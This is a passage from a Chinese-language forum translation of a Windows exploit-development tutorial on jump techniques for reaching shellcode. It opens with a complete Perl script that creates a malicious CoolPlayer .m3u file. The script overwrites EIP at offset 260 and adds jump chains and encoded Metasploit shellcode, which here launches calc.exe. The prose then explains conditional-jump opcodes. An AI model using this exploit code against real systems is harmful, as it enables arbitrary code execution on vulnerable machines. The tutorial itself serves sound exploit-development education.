
```perl
#!/usr/bin/perl

my $buffsize = 10000; # set consistent buffer size

my $jmp1 = "\xeb\x32"; # 50 byte short jump to hop over EIP and garbage and into next short jump
my $junk = "\x90" x (260 - length($jmp1)); # nops to slide into $jmp; offset to eip overwrite at 260
my $eip = pack('V',0x7c810395); # call ebx [kernel32.dll] which points to start of buffer and our jump code
my $garbage1 = "\xcc" x 45;

my $jmp2 = "\x90\x90\x90\x90\x90\x90\xeb\x64"; # 100 byte short jump over garbage 2 and into NOPs/shellcode
my $garbage2 = "\xcc" x 97;

my $nops = "\x90" x 50;

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R |
# msfencode -e x86/shikata_ga_nai -t perl -c 1 -b '\x00\x0a\x0d\xff'

my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";

my $sploit = $junk.$jmp1.$eip.$garbage1.$jmp2.$garbage2.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, "&gt;$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
```

尽管这里没有真正的实际目的，但我将通过用“ `\x90\x90\x90\x90\x90\x90\x90\xeb\xea` ” 替换 `$jmp2` 来表现向后的短跳跃，以表示向后跳跃的有效长度20（技术上来说22是通过跳过本身来丢失2个字节）。这样做应该使我们的 `INT` 指令返回20个字节。

![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_AF9HPWX48JA5AUN.png)

有用。对于这个特定的漏洞，再次没有真正的实际目的，但是这些例子应该说明在发现自己处于漏洞需求的情况下短跳转的可能性。条件跳转只是在某些条件满足时采取的近/短跳转，取决于相应标志的状态（请回顾第1部分的 `EFLAGS` 寄存器）。例如，如果零标志被设置为1，则采取“如果等于跳转”（`JE`）或“如果跳转为零”（`JZ`）则跳转。相反，“跳转如果不相等”（`JNE`）或“跳转如果不是零“如果零标志被设置为0，则采用（`JNZ`）。该语法类似于常规短跳转，只是使用不同的操作码。`JNE` 的操作码是 `75`，所以向前跳20个字节的指令是 `\x75\x14`。我不会给出另一个条件跳转的演示，因为这个概念与之前的短跳转例子完全相同。请记住，因为您可能面临无法使用无条件标准短跳转的情况，因此您必须转向条件跳转。尽管它涵盖了我在这个漏洞利用开发系列中尚未涉及的主题，但如果您想要一个真实的例子说明为什么在构建漏洞利用时您可能需要使用条件跳转，请查看[此页面](https://bbs.kanxue.com/elink@25dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4c8Z5k6h3N6J5k6i4W2U0L8%4u0F1k6i4u0Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5H3i4K6u0r3x3o6u0Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0V1j5Y4g2X3k6X3g2J5i4K6u0V1L8%4k6W2M7X3k6D9L8%4N6Q4x3X3c8@1N6i4c8G2M7X3W2S2L8q4)9J5k6h3S2@1L8h3H3`.)。下面是可用的条件跳转及其相应的操作码和状态标志的一个很好的参考：http : //cbaK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4g2F1K9i4S2%4K9i4A6Q4x3X3g2F1k6i4c8Q4x3V1k6@1k6h3y4Z5N6r3W2H3M7#2)9J5c8Y4R3^5y4W2)9J5k6r3A6#2L8i4m8K6i4K6u0W2K9s2c8E0L8q4!0q4x3#2)9^5x3q4)9^5x3R3`.

## 结论

我希望Windows漏洞利用系列文章中的这一部分清楚地说明了使用各种跳转技术访问shellcode的一些方法，包括操纵寄存器和堆栈的内容以及使用无条件跳转或条件跳转。请记住，这不是一个详尽的可能性列表，您可能会发现在构建漏洞利用时使用这些跳跃技术的各种组合。在第5部分中，我们将介绍另一种查找称为Egghunting的shellcode的技术。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-1-24 17:05

被admin编辑，原因：
